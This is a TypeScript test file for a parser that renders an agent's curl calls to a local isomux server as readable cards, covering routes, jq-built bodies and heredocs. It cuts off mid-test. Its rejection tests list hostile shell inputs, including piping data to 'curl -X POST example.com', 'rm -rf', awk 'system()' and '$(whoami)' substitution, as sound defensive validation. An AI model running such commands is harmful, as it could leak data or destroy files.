import { describe, expect, test } from "bun:test";
import {
  parseIsomuxCurl,
  describeIsomuxRoute,
  humanizeIsomuxRequest,
  pipeTailForDisplay,
  BASH_RAW_SUMMARY_CHARS,
} from "./isomux-curl.ts";

describe("parseIsomuxCurl", () => {
  test("simple GET task list", () => {
    const req = parseIsomuxCurl("curl -s localhost:4000/api/tasks");
    expect(req).not.toBeNull();
    expect(req!.method).toBe("GET");
    expect(req!.path).toBe("/api/tasks");
    expect(req!.action).toBe("List tasks");
    expect(req!.bodyFields).toBeNull();
    expect(req!.pipeTail).toBeNull();
  });

  test("GET with query string", () => {
    const req = parseIsomuxCurl("curl -s localhost:4000/api/tasks?status=all");
    expect(req!.path).toBe("/api/tasks?status=all");
    expect(req!.action).toBe("List tasks");
  });

  test("POST create task with JSON body", () => {
    const req = parseIsomuxCurl(
      `curl -s -X POST localhost:4000/api/tasks -H 'Content-Type: application/json' -d '{"title":"Fix bug","createdBy":"Isomuxer1","priority":"P1"}'`,
    );
    expect(req!.method).toBe("POST");
    expect(req!.action).toBe("Create task");
    expect(req!.bodyFields).toEqual([
      { key: "title", value: "Fix bug" },
      { key: "createdBy", value: "Isomuxer1" },
      { key: "priority", value: "P1" },
    ]);
    expect(req!.hasAuth).toBe(false);
  });

  test("multi-line continuation (backslash-newline)", () => {
    const req = parseIsomuxCurl(
      `curl -s -X POST localhost:4000/api/tasks -H 'Content-Type: application/json' \\\n  -d '{"title":"X","createdBy":"Me"}'`,
    );
    expect(req).not.toBeNull();
    expect(req!.method).toBe("POST");
    expect(req!.bodyFields![0]).toEqual({ key: "title", value: "X" });
  });

  test("send agent message with bearer token env var", () => {
    const req = parseIsomuxCurl(
      `curl -s -X POST localhost:4000/api/agents/agent-123-abc/messages -H "Authorization: Bearer $ISOMUX_AGENT_TOKEN" -H 'Content-Type: application/json' -d '{"text":"hello there"}'`,
    );
    expect(req!.action).toBe("Send agent message");
    expect(req!.path).toBe("/api/agents/agent-123-abc/messages");
    expect(req!.hasAuth).toBe(true);
    expect(req!.bodyFields).toEqual([{ key: "text", value: "hello there" }]);
  });

  test("claim and done task routes", () => {
    expect(
      parseIsomuxCurl(
        `curl -s -X POST localhost:4000/api/tasks/28ab9400/claim -H 'Content-Type: application/json' -d '{"assignee":"Isomuxer1"}'`,
      )!.action,
    ).toBe("Claim task");
    expect(
      parseIsomuxCurl(
        `curl -s -X POST localhost:4000/api/tasks/28ab9400/done -d '{}'`,
      )!.action,
    ).toBe("Complete task");
  });

  test("empty JSON object body yields empty bodyFields", () => {
    const req = parseIsomuxCurl(
      `curl -s -X POST localhost:4000/api/agents/a1/diff -H "Authorization: Bearer $T" -d '{}'`,
    );
    expect(req!.action).toBe("Show diff in chat");
    expect(req!.bodyFields).toEqual([]);
    expect(req!.bodyRaw).toBeNull();
  });

  test("-d implies POST", () => {
    const req = parseIsomuxCurl(
      `curl -s localhost:4000/api/memory -d '{"scope":"agent","text":"fact"}'`,
    );
    expect(req!.method).toBe("POST");
    expect(req!.action).toBe("Append memory");
  });

  test("nested JSON values are stringified compactly", () => {
    const req = parseIsomuxCurl(
      `curl -s -X PUT localhost:4000/api/memory -d '{"scope":"room","meta":{"a":1,"b":[2,3]}}'`,
    );
    expect(req!.action).toBe("Replace memory");
    expect(req!.bodyFields).toEqual([
      { key: "scope", value: "room" },
      { key: "meta", value: '{"a":1,"b":[2,3]}' },
    ]);
  });

  test("non-JSON body falls back to bodyRaw", () => {
    const req = parseIsomuxCurl(
      `curl -s -X POST localhost:4000/api/tasks -d 'title=hello&x=1'`,
    );
    expect(req!.bodyFields).toBeNull();
    expect(req!.bodyRaw).toBe("title=hello&x=1");
  });

  test("body with $VAR inside JSON is not valid JSON, kept raw", () => {
    const req = parseIsomuxCurl(
      `curl -s -X POST localhost:4000/api/tasks -d "{\\"title\\": $TITLE}"`,
    );
    expect(req!.bodyFields).toBeNull();
    expect(req!.bodyRaw).toBe('{"title": $TITLE}');
  });

  test("pipe tail is captured verbatim", () => {
    const req = parseIsomuxCurl(
      `curl -s localhost:4000/api/tasks | jq '.[] | .title'`,
    );
    expect(req).not.toBeNull();
    expect(req!.path).toBe("/api/tasks");
    expect(req!.pipeTail).toBe(`| jq '.[] | .title'`);
  });

  test("pipe into sed redaction", () => {
    const req = parseIsomuxCurl(
      `curl -s 'localhost:4000/api/memory?scope=agent' -H "Authorization: Bearer $ISOMUX_AGENT_TOKEN" | sed 's/tok-[a-z0-9]*/REDACTED/g'`,
    );
    expect(req!.action).toBe("Read memory");
    expect(req!.path).toBe("/api/memory?scope=agent");
    expect(req!.pipeTail).toStartWith("| sed");
  });

  test("multi-stage filter pipeline accepted", () => {
    const req = parseIsomuxCurl(
      `curl -s localhost:4000/api/tasks | jq '.[] | .title' | head -5`,
    );
    expect(req).not.toBeNull();
    expect(req!.pipeTail).toBe(`| jq '.[] | .title' | head -5`);
  });

  test("pipe into python json.tool accepted", () => {
    expect(
      parseIsomuxCurl(
        "curl -s localhost:4000/api/tasks | python3 -m json.tool",
      ),
    ).not.toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks | python3 evil.py"),
    ).toBeNull();
  });

  test("rejects pipe tails that aren't pure display filters", () => {
    // A second command hidden after the filter.
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks | cat; rm -rf /tmp/x"),
    ).toBeNull();
    // Redirection in the tail.
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks | cat > /tmp/out"),
    ).toBeNull();
    // Command substitution in the tail.
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks | grep $(cat pattern)"),
    ).toBeNull();
    // Non-filter commands (could have side effects / send data elsewhere).
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks | curl example.com"),
    ).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks | xargs rm"),
    ).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks | tee /tmp/out"),
    ).toBeNull();
    // Bare/empty pipe stages.
    expect(parseIsomuxCurl("curl -s localhost:4000/api/tasks |")).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks | | cat"),
    ).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks | jq '.' |"),
    ).toBeNull();
    // awk is arbitrary code (system()), not on the allowlist.
    expect(
      parseIsomuxCurl(
        `curl -s localhost:4000/api/tasks | awk 'BEGIN { system("touch /tmp/pwn") }'`,
      ),
    ).toBeNull();
  });

  // Task c9f35c77: a long tail used to sink the whole card to raw rendering,
  // which showed LESS of the command (the raw summary is the first 80 chars of
  // the whole thing). Length no longer gates the parse; the header truncates
  // the displayed tail instead.
  test("accepts pipe tails of any length", () => {
    const longTail = `| jq '${"x".repeat(90)}'`;
    const req = parseIsomuxCurl(`curl -s localhost:4000/api/tasks ${longTail}`);
    expect(req).not.toBeNull();
    expect(req!.path).toBe("/api/tasks");
    expect(req!.pipeTail).toBe(longTail);
  });

  // The reported repro: a ~113-char jq program over GET /agents.
  test("accepts a long complex jq program (quotes, tabs, interpolation)", () => {
    const tail = `| jq -r '.[] | select(.name|test("Reviewer1|Isomuxer1")) | "\\(.name)\\t\\(.modelFamily)/\\(.model)\\t[\\(.roomName)]"'`;
    const req = parseIsomuxCurl(
      `curl -s localhost:4000/agents -H "Authorization: Bearer $ISOMUX_AGENT_TOKEN" ${tail}`,
    );
    expect(req).not.toBeNull();
    expect(req!.path).toBe("/agents");
    expect(req!.hasAuth).toBe(true);
    expect(req!.pipeTail).toBe(tail);
  });

  // Length is not a proxy for danger, so removing the cap must not open the
  // command gate: a long tail whose stages aren't display filters still bails.
  test("still rejects long tails that aren't display filters", () => {
    const pad = "x".repeat(90);
    expect(
      parseIsomuxCurl(
        `curl -s localhost:4000/api/tasks | jq '.${pad}' | curl -X POST example.com -d @-`,
      ),
    ).toBeNull();
    expect(
      parseIsomuxCurl(
        `curl -s localhost:4000/api/tasks | awk '{print "${pad}"}'`,
      ),
    ).toBeNull();
  });

  // The safety property the removed length cap used to provide, now pinned
  // directly: whatever the card elides, the raw row it replaces would have
  // elided too. This reads BASH_RAW_SUMMARY_CHARS rather than restating 80, so
  // widening the raw summary in LogEntryCard.tsx without revisiting
  // MAX_TAIL_DISPLAY fails here instead of silently narrowing the card.
  test("displayed tail never shows less than the raw collapsed row would", () => {
    const longTail = `| jq '${"x".repeat(300)}'`;
    // Characters of the tail the raw command slice would reach past a prefix.
    const rawShowsAfter = (prefix: string) =>
      Math.max(0, BASH_RAW_SUMMARY_CHARS - (prefix.length + 1));

    // The load-bearing case: the shortest curl that parses at all leaves the
    // most of the raw budget for the tail, so it is the tightest bound.
    const shortest = "curl localhost:4000";
    const req = parseIsomuxCurl(`${shortest} ${longTail}`);
    expect(req).not.toBeNull();
    const shown = pipeTailForDisplay(req!.pipeTail!).replace("…", "");
    expect(shown.length).toBeGreaterThanOrEqual(rawShowsAfter(shortest));
    expect(longTail.startsWith(shown)).toBe(true);

    // Longer prefixes only shrink the raw budget, so they hold a fortiori.
    for (const prefix of [
      "curl -s localhost:4000/api/tasks",
      `curl -s -X POST localhost:4000/api/tasks -H "Authorization: Bearer $T"`,
    ]) {
      const r = parseIsomuxCurl(`${prefix} ${longTail}`);
      expect(r).not.toBeNull();
      const s = pipeTailForDisplay(r!.pipeTail!).replace("…", "");
      expect(s.length).toBeGreaterThanOrEqual(rawShowsAfter(prefix));
      expect(longTail.startsWith(s)).toBe(true);
    }
  });

  test("short tails are shown in full", () => {
    const tail = `| jq '.[] | .title'`;
    expect(pipeTailForDisplay(tail)).toBe(tail);
  });

  // The allowlist is a coarse gate, not a purity proof: allowed commands can
  // still have side effects via their arguments. The safety property is that
  // the header shows at least as much of the tail as the raw collapsed
  // rendering would, so the card never conceals what raw would have shown.
  test("side-effecting args of allowed filters parse, with verbatim pipeTail", () => {
    const cases = [
      "| sed -e w/tmp/pwn",
      "| sort -o /tmp/pwn",
      "| uniq /dev/stdin /tmp/pwn",
    ];
    for (const tail of cases) {
      const req = parseIsomuxCurl(`curl -s localhost:4000/api/tasks ${tail}`);
      expect(req).not.toBeNull();
      expect(req!.pipeTail).toBe(tail);
    }
  });

  test("http:// scheme and 127.0.0.1 accepted", () => {
    expect(
      parseIsomuxCurl("curl http://localhost:4000/api/tasks"),
    ).not.toBeNull();
    expect(parseIsomuxCurl("curl -s 127.0.0.1:4000/api/tasks")).not.toBeNull();
  });

  test("attached short flag value (-XPOST) and clustered booleans (-sS)", () => {
    const req = parseIsomuxCurl(
      `curl -sS -XPOST localhost:4000/api/tasks -d '{"title":"t"}'`,
    );
    expect(req!.method).toBe("POST");
  });

  test("--request=POST long form with equals", () => {
    const req = parseIsomuxCurl("curl --request=POST localhost:4000/api/tasks");
    expect(req!.method).toBe("POST");
  });

  test("DELETE scheduled message", () => {
    const req = parseIsomuxCurl(
      `curl -s -X DELETE localhost:4000/api/agents/agent-1/scheduled-messages/sched-9 -H "Authorization: Bearer $T"`,
    );
    expect(req!.method).toBe("DELETE");
    expect(req!.action).toBe("Cancel scheduled message");
  });

  test("unknown isomux route still parses, without action label", () => {
    const req = parseIsomuxCurl("curl -s localhost:4000/api/office/settings");
    expect(req).not.toBeNull();
    expect(req!.action).toBeNull();
    expect(req!.method).toBe("GET");
  });

  test("path containing $VAR is kept literally", () => {
    const req = parseIsomuxCurl(
      `curl -s -X POST "localhost:4000/api/agents/$RECEIVER/messages" -d '{"text":"hi"}'`,
    );
    expect(req!.path).toBe("/api/agents/$RECEIVER/messages");
    // Unknown segment value still matches the wildcard route.
    expect(req!.action).toBe("Send agent message");
  });

  test("custom extra port accepted when passed", () => {
    expect(parseIsomuxCurl("curl -s localhost:8080/api/tasks")).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:8080/api/tasks", ["4000", "8080"]),
    ).not.toBeNull();
  });

  // --- rejections: must degrade to raw rendering ---

  test("rejects non-isomux hosts and ports", () => {
    expect(parseIsomuxCurl("curl -s https://example.com/api")).toBeNull();
    expect(parseIsomuxCurl("curl -s localhost:5599/api/state")).toBeNull();
    expect(parseIsomuxCurl("curl -s auntie:4000/api/tasks")).toBeNull();
  });

  test("rejects non-curl commands", () => {
    expect(parseIsomuxCurl("ls -la")).toBeNull();
    expect(parseIsomuxCurl("echo curl localhost:4000/api/tasks")).toBeNull();
    expect(parseIsomuxCurl("")).toBeNull();
  });

  test("rejects compound commands and stderr file redirections", () => {
    // `;`/`&&` chains onto a display/inspection command are now accepted WITH
    // the trailing statement shown verbatim (see the trailing-statement suite);
    // a chain onto anything else still stays raw.
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks && make deploy"),
    ).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks; ssh box uptime"),
    ).toBeNull();
    // Stdout-to-file is now accepted WITH the path surfaced on the card
    // (see the output-to-file suite); stderr-to-file still stays raw.
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks 2> /tmp/err.log"),
    ).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks || true"),
    ).toBeNull();
  });

  test("accepts side-effect-free stream redirections", () => {
    // The transcript staples: discard stderr, discard stdout, merge streams.
    for (const cmd of [
      "curl -s localhost:4000/api/tasks 2>/dev/null",
      "curl -s localhost:4000/api/tasks 2> /dev/null",
      "curl -s localhost:4000/api/tasks >/dev/null",
      "curl -s localhost:4000/api/tasks 1>/dev/null",
      "curl -s localhost:4000/api/tasks > /dev/null",
    ]) {
      const req = parseIsomuxCurl(cmd);
      expect(req).not.toBeNull();
      expect(req!.path).toBe("/api/tasks");
    }
    // 2>&1 composes with a display pipe (the real-world failing shape).
    const req = parseIsomuxCurl(
      "curl -s localhost:4000/api/tasks 2>&1 | head -c 250",
    );
    expect(req).not.toBeNull();
    expect(req!.pipeTail).toBe("| head -c 250");
    // Redirections inside tail stages are tolerated too.
    expect(
      parseIsomuxCurl(
        "curl -s localhost:4000/api/tasks | python3 -m json.tool 2>/dev/null | head -5",
      ),
    ).not.toBeNull();
  });

  test("rejects redirections beyond the safe set", () => {
    // Append, weird fds, fd-looking arguments, quoted fd digits.
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks 2>>/dev/null"),
    ).toBeNull();
    expect(parseIsomuxCurl("curl -s localhost:4000/api/tasks 2>&2")).toBeNull();
    expect(parseIsomuxCurl("curl -s localhost:4000/api/tasks >&1")).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks abc2>/dev/null"),
    ).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks '2'>/dev/null"),
    ).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks 2>/dev/nullx"),
    ).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks < /tmp/x"),
    ).toBeNull();
  });

  test("rejects command substitution", () => {
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks/$(cat id)/done"),
    ).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks/`cat id`/done"),
    ).toBeNull();
    expect(
      parseIsomuxCurl(
        `curl -s -d "{\\"x\\": \\"$(whoami)\\"}" localhost:4000/api/tasks`,
      ),
    ).toBeNull();
  });

  test("value-restricted options: /dev/null, dash, harmless write-out pass", () => {
    // Discard the response body (no file written).
    expect(
      parseIsomuxCurl("curl -s -o /dev/null localhost:4000/api/tasks"),
    ).not.toBeNull();
    expect(
      parseIsomuxCurl("curl -s --output /dev/null localhost:4000/api/tasks"),
    ).not.toBeNull();
    // Headers to stdout.
    expect(
      parseIsomuxCurl("curl -s -D - localhost:4000/api/tasks"),
    ).not.toBeNull();
    // Status-code write-out, the standard probe idiom.
    const probe = parseIsomuxCurl(
      `curl -s -o /dev/null -w '%{http_code}' -X POST localhost:4000/api/agents/a1/diff -d '{}'`,
    );
    expect(probe).not.toBeNull();
    expect(probe!.action).toBe("Show diff in chat");
    expect(
      parseIsomuxCurl(
        `curl -s localhost:4000/api/tasks --write-out '%{http_code}'`,
      ),
    ).not.toBeNull();
    // But a dump-header file, or a write-out that touches files, rejects.
    expect(
      parseIsomuxCurl("curl -s -D /tmp/headers localhost:4000/api/tasks"),
    ).toBeNull();
    expect(
      parseIsomuxCurl(`curl -s localhost:4000/api/tasks -w @fmt.txt`),
    ).toBeNull();
  });

  test("rejects options whose semantics the card would conceal", () => {
    // -o/--output with a real path is now accepted WITH the path surfaced
    // on the card (see the output-to-file suite), so it no longer belongs
    // here.
    // Upload: changes method and supplies a body the card wouldn't show.
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/memory -T /tmp/payload"),
    ).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/memory --upload-file /tmp/p"),
    ).toBeNull();
    // Credentials.
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks -u admin:secret"),
    ).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks --user admin:secret"),
    ).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks -b session=abc"),
    ).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks --cookie s=1"),
    ).toBeNull();
    // Extra request headers via dedicated options.
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks -A myagent"),
    ).toBeNull();
    expect(
      parseIsomuxCurl("curl -s localhost:4000/api/tasks -e http://x"),
    ).toBeNull();
    // write-out: %output{file} (curl >= 8.3.0) writes a file.
    expect(
      parseIsomuxCurl(
        `curl -s localhost:4000/api/tasks -w '%output{/tmp/pwn}x'`,
      ),
    ).toBeNull();
  });

  test("only Content-Type and Authorization headers are admitted", () => {
    // Generic -H must not bypass the rejected credential/header flags.
    expect(
      parseIsomuxCurl(
        `curl -s localhost:4000/api/tasks -H 'Cookie: session=abc'`,
      ),
    ).toBeNull();
    expect(
      parseIsomuxCurl(
        `curl -s localhost:4000/api/tasks --header 'Cookie: session=abc'`,
      ),
    ).toBeNull();
    expect(
      parseIsomuxCurl(
        `curl -s localhost:4000/api/tasks -H 'User-Agent: myagent'`,
      ),
    ).toBeNull();
    expect(
      parseIsomuxCurl(`curl -s localhost:4000/api/tasks -H 'X-Custom: 1'`),
    ).toBeNull();
    // The two transcript-standard headers still pass (case-insensitive).
    expect(
      parseIsomuxCurl(
        `curl -s localhost:4000/api/tasks -H 'content-type: application/json' --header "AUTHORIZATION: Bearer $T"`,
      ),
    ).not.toBeNull();
  });

  test("transport-neutral options remain accepted", () => {
    expect(
      parseIsomuxCurl(
        "curl -s -m 5 --retry 2 --connect-timeout 3 localhost:4000/api/tasks",
      ),
    ).not.toBeNull();
  });

  test("rejects unknown flags and multiple URLs", () => {
    expect(
      parseIsomuxCurl("curl --weird-flag localhost:4000/api/tasks"),
    ).toBeNull();
    expect(parseIsomuxCurl("curl -Z localhost:4000/api/tasks")).toBeNull();
    expect(
      parseIsomuxCurl("curl localhost:4000/a localhost:4000/b"),
    ).toBeNull();
  });

  test("rejects unescaped multi-line commands", () => {
    expect(parseIsomuxCurl("curl -s localhost:4000/api/tasks\nls")).toBeNull();
  });

  test("rejects unterminated quotes", () => {
    expect(
      parseIsomuxCurl(`curl -s localhost:4000/api/tasks -d '{"title":`),
    ).toBeNull();
  });

  test("bare loopback root path defaults to /", () => {
    const req = parseIsomuxCurl("curl -s localhost:4000");
    expect(req).not.toBeNull();
    expect(req!.path).toBe("/");
    expect(req!.action).toBeNull();
  });
});

describe("parseIsomuxCurl jq producer pipelines", () => {
  const CURL_TAIL = `curl -s -X POST localhost:4000/api/agents/agent-1/messages -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d @-`;

  test("resolves a literal --arg template into body fields", () => {
    const req = parseIsomuxCurl(
      `jq -n --arg text "$MSG" '{text: $text}' | ${CURL_TAIL}`,
    );
    expect(req).not.toBeNull();
    expect(req!.method).toBe("POST");
    expect(req!.action).toBe("Send agent message");
    expect(req!.bodyFields).toEqual([{ key: "text", value: "$MSG" }]);
    expect(req!.bodyNote).toBeNull();
    expect(req!.hasAuth).toBe(true);
  });

  test("resolves mixed literals, --argjson, and --rawfile", () => {
    const req = parseIsomuxCurl(
      `jq -n --arg t "hi there" --argjson n 5 --rawfile body /tmp/notes.md '{title: $t, count: $n, text: $body, "done": false, note: "x"}' | ${CURL_TAIL}`,
    );
    expect(req!.bodyFields).toEqual([
      { key: "title", value: "hi there" },
      { key: "count", value: "5" },
      { key: "text", value: "@/tmp/notes.md" },
      { key: "done", value: "false" },
      { key: "note", value: "x" },
    ]);
  });

  test("--argjson values are interpreted as JSON, not shown raw", () => {
    // A JSON string loses its quotes; structured values display compactly.
    const req = parseIsomuxCurl(
      `jq -n --argjson s '"hi there"' --argjson o '{"a": 1, "b": [2]}' '{greeting: $s, meta: $o}' | ${CURL_TAIL}`,
    );
    expect(req!.bodyFields).toEqual([
      { key: "greeting", value: "hi there" },
      { key: "meta", value: '{"a":1,"b":[2]}' },
    ]);
  });

  test("invalid --argjson JSON rejects the parse (jq would fail eagerly)", () => {
    // jq validates --argjson up front: the whole invocation fails and curl
    // sends an empty body, so any card would misrepresent the request.
    expect(
      parseIsomuxCurl(`jq -n --argjson x nope '{x: $x}' | ${CURL_TAIL}`),
    ).toBeNull();
    // Even when the program never references the bad var.
    expect(
      parseIsomuxCurl(`jq -n --argjson x nope '{y: 1}' | ${CURL_TAIL}`),
    ).toBeNull();
  });

  test("clustered -nc and an empty template resolve", () => {
    const req = parseIsomuxCurl(`jq -nc '{}' | ${CURL_TAIL}`);
    expect(req).not.toBeNull();
    expect(req!.bodyFields).toEqual([]);
  });

  test("complex programs fall back to the body-built-with-jq note", () => {
    const req = parseIsomuxCurl(
      `jq -n --arg t "x" '{text: ($t | ascii_upcase)}' | ${CURL_TAIL}`,
    );
    expect(req).not.toBeNull();
    expect(req!.bodyFields).toBeNull();
    expect(req!.bodyNote).toBe("body built with jq");
  });

  test("unresolved --rawfile is named in the note, never concealed", () => {
    const req = parseIsomuxCurl(
      `jq -n --rawfile body /tmp/notes.md '{text: $body, ts: now}' | ${CURL_TAIL}`,
    );
    expect(req!.bodyNote).toBe("body built with jq (reads /tmp/notes.md)");
  });

  test("string interpolation and undefined vars are not literal templates", () => {
    expect(
      parseIsomuxCurl(`jq -n --arg t "x" '{text: "hi \\($t)"}' | ${CURL_TAIL}`)!
        .bodyNote,
    ).toBe("body built with jq");
    expect(
      parseIsomuxCurl(`jq -n '{text: $missing}' | ${CURL_TAIL}`)!.bodyNote,
    ).toBe("body built with jq");
    // Without -n the program reads stdin, so it is never resolved.
    expect(
      parseIsomuxCurl(`jq --arg t "x" '{text: $t}' | ${CURL_TAIL}`)!.bodyNote,
    ).toBe("body built with jq");
  });

  test("producer curl may keep a display pipe tail", () => {
    const req = parseIsomuxCurl(
      `jq -n '{text: "hi"}' | ${CURL_TAIL} | head -c 100`,
    );
    expect(req).not.toBeNull();
    expect(req!.pipeTail).toBe("| head -c 100");
  });

  test("rejects producers that don't actually feed the body", () => {
    // No -d @- on the curl: jq output is discarded.
    expect(
      parseIsomuxCurl(
        `jq -n '{text: "hi"}' | curl -s -X POST localhost:4000/api/tasks -d '{"title":"x"}'`,
      ),
    ).toBeNull();
    // --data-raw does not interpret @, so @- is a literal, not stdin.
    expect(
      parseIsomuxCurl(
        `jq -n '{text: "hi"}' | curl -s -X POST localhost:4000/api/tasks --data-raw @-`,
      ),
    ).toBeNull();
    // -G diverts data to the query string.
    expect(
      parseIsomuxCurl(
        `jq -n '{text: "hi"}' | curl -s -G localhost:4000/api/tasks -d @-`,
      ),
    ).toBeNull();
  });

  test("rejects jq stages beyond the safe grammar", () => {
    // -f reads the program from a file.
    expect(parseIsomuxCurl(`jq -n -f /tmp/prog.jq | ${CURL_TAIL}`)).toBeNull();
    // Positional input files after the program.
    expect(
      parseIsomuxCurl(`jq '.[0]' /tmp/input.json | ${CURL_TAIL}`),
    ).toBeNull();
    // --slurpfile is not on the allowlist.
    expect(
      parseIsomuxCurl(
        `jq -n --slurpfile d /tmp/d.json '{d: $d}' | ${CURL_TAIL}`,
      ),
    ).toBeNull();
    // No program at all.
    expect(parseIsomuxCurl(`jq -n | ${CURL_TAIL}`)).toBeNull();
  });

  test("only jq qualifies as a producer; jq without a curl stays raw", () => {
    expect(parseIsomuxCurl(`sed s/x/y/ /tmp/f | ${CURL_TAIL}`)).toBeNull();
    expect(parseIsomuxCurl(`jq -n '{a: 1}'`)).toBeNull();
    expect(parseIsomuxCurl(`jq -n '{a: 1}' | head -5`)).toBeNull();
    // Producer curl must still target isomux.
    expect(
      parseIsomuxCurl(`jq -n '{a: 1}' | curl -s example.com -d @-`),
    ).toBeNull();
  });

  test("standalone curl -d @- keeps its old raw-body rendering", () => {
    const req = parseIsomuxCurl(
      `curl -s -X POST localhost:4000/api/tasks -d @-`,
    );
    expect(req).not.toBeNull();
    expect(req!.bodyRaw).toBe("@-");
    expect(req!.bodyNote).toBeNull();
  });

  test("humanize works through a resolved producer body", () => {
    const req = parseIsomuxCurl(
      `jq -n --arg text "hello" '{text: $text}' | ${CURL_TAIL}`,
    );
    expect(
      humanizeIsomuxRequest(req!, (id) => (id === "agent-1" ? "Bob" : null)),
    ).toBe("Send a message to Bob");
  });
});

describe("parseIsomuxCurl heredoc / -Rs slurp producers", () => {
  const CURL_TAIL = `curl -s -X POST localhost:4000/api/agents/agent-1/messages -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d @-`;

  test("manager-brief shape: heredoc-fed jq -Rs resolves the body as fields", () => {
    const req = parseIsomuxCurl(
      `jq -Rs '{text: .}' <<'EOF' | ${CURL_TAIL}\nTASK: fix the parser.\nDetails on a second line.\nEOF`,
    );
    expect(req).not.toBeNull();
    expect(req!.method).toBe("POST");
    expect(req!.action).toBe("Send agent message");
    // The heredoc body IS the payload, shown as the field value (whitespace
    // collapsed for display, like every other field).
    expect(req!.bodyFields).toEqual([
      { key: "text", value: "TASK: fix the parser. Details on a second line." },
    ]);
    expect(req!.bodyNote).toBeNull();
    expect(req!.hasAuth).toBe(true);
  });

  test("no-space program, long flags, and double-quoted delimiter", () => {
    const req = parseIsomuxCurl(
      `jq --raw-input --slurp '{text:.}' <<"END" | ${CURL_TAIL}\nhello\nEND`,
    );
    expect(req!.bodyFields).toEqual([{ key: "text", value: "hello" }]);
  });

  test("heredoc composes with --arg vars and literals", () => {
    const req = parseIsomuxCurl(
      `jq -Rs --arg who Nil '{text: ., from: $who, urgent: true}' <<'EOF' | ${CURL_TAIL}\nthe brief\nEOF`,
    );
    expect(req!.bodyFields).toEqual([
      { key: "text", value: "the brief" },
      { key: "from", value: "Nil" },
      { key: "urgent", value: "true" },
    ]);
  });

  test("unquoted delimiter accepted only for expansion-free bodies", () => {
    expect(
      parseIsomuxCurl(
        `jq -Rs '{text: .}' <<EOF | ${CURL_TAIL}\nplain prose body\nEOF`,
      )!.bodyFields,
    ).toEqual([{ key: "text", value: "plain prose body" }]);
    // $, backtick, or backslash in an unquoted heredoc would be expanded by
    // the shell - the card would show pre-expansion text. Stays raw.
    expect(
      parseIsomuxCurl(
        `jq -Rs '{text: .}' <<EOF | ${CURL_TAIL}\ncosts $HOME dollars\nEOF`,
      ),
    ).toBeNull();
    // Quoted delimiter takes the same body literally - accepted.
    expect(
      parseIsomuxCurl(
        `jq -Rs '{text: .}' <<'EOF' | ${CURL_TAIL}\ncosts $HOME dollars\nEOF`,
      )!.bodyFields,
    ).toEqual([{ key: "text", value: "costs $HOME dollars" }]);
  });

  test("empty heredoc body resolves to an empty field", () => {
    const req = parseIsomuxCurl(
      `jq -Rs '{text: .}' <<'EOF' | ${CURL_TAIL}\nEOF`,
    );
    expect(req!.bodyFields).toEqual([{ key: "text", value: "" }]);
  });

  test("heredoc with an unresolvable program stays raw - the body is never concealed", () => {
    // A "body built with jq" note here would hide the payload text, unlike
    // the file-fed case where naming the path is full disclosure.
    expect(
      parseIsomuxCurl(
        `jq -Rs '{text: (. | rtrimstr("\\n"))}' <<'EOF' | ${CURL_TAIL}\nbody\nEOF`,
      ),
    ).toBeNull();
  });

  test("file-fed jq -Rs resolves the body with an @path marker", () => {
    const req = parseIsomuxCurl(
      `jq -Rs '{text: .}' /tmp/brief.md | ${CURL_TAIL}`,
    );
    expect(req).not.toBeNull();
    expect(req!.bodyFields).toEqual([{ key: "text", value: "@/tmp/brief.md" }]);
    expect(req!.bodyNote).toBeNull();
  });

  test("file-fed with an unresolvable program falls back to a note naming the file", () => {
    const req = parseIsomuxCurl(
      `jq -Rs '{text: (. | ascii_upcase)}' /tmp/brief.md | ${CURL_TAIL}`,
    );
    expect(req).not.toBeNull();
    expect(req!.bodyFields).toBeNull();
    expect(req!.bodyNote).toBe("body built with jq (reads /tmp/brief.md)");
  });

  test("input-shaping flags without a modeled input source", () => {
    // -Rs reading (empty) stdin: accepted, unresolved - note only.
    expect(parseIsomuxCurl(`jq -Rs '{text: .}' | ${CURL_TAIL}`)!.bodyNote).toBe(
      "body built with jq",
    );
    // `.` under -n has no input to show - never resolves to a field.
    expect(parseIsomuxCurl(`jq -n '{text: .}' | ${CURL_TAIL}`)!.bodyNote).toBe(
      "body built with jq",
    );
  });

  test("rejects input shapes beyond the -Rs slurp grammar", () => {
    // Heredoc without both -R and -s: line-by-line / JSON input semantics
    // we don't model.
    expect(
      parseIsomuxCurl(`jq -R '{text: .}' <<'EOF' | ${CURL_TAIL}\nx\nEOF`),
    ).toBeNull();
    expect(
      parseIsomuxCurl(`jq -s '{text: .}' <<'EOF' | ${CURL_TAIL}\nx\nEOF`),
    ).toBeNull();
